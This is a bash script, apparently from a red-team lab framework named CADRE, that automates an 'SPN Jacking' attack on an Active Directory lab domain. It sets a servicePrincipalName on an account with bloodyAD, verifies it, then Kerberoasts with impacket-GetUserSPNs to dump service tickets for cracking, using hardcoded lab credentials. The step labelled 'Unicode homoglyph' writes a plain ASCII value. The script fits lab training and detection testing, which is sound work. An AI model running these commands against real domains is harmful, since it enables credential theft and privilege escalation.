#!/bin/bash
# CADRE — WT#027 SPN Jacking
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#027 — SPN Jacking"
start_attack "027" "SPN Jacking"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Register SPN with Unicode homoglyph on analyst_cloud"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u analyst_cloud -p 'Cl0ud_An@lyst!' set object \"CN=analyst_cloud,OU=Cloud,DC=cadre,DC=local\" servicePrincipalName -v \"ops/analyst_cloud-test\""

step "Step 2: Verify SPN was registered"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u analyst_cloud -p 'Cl0ud_An@lyst!' get object \"CN=analyst_cloud,OU=Cloud,DC=cadre,DC=local\" --attr servicePrincipalName"

step "Step 3: Attempt Kerberoast against jacked SPN"
run_cmd "impacket-GetUserSPNs \"$DOMAIN_ROOT/analyst_cloud:'Cl0ud_An@lyst!'\" -dc-ip $DC01 -request -outputfile jacked_spn_tgs.txt"

result $? "SPN Jacking completed"
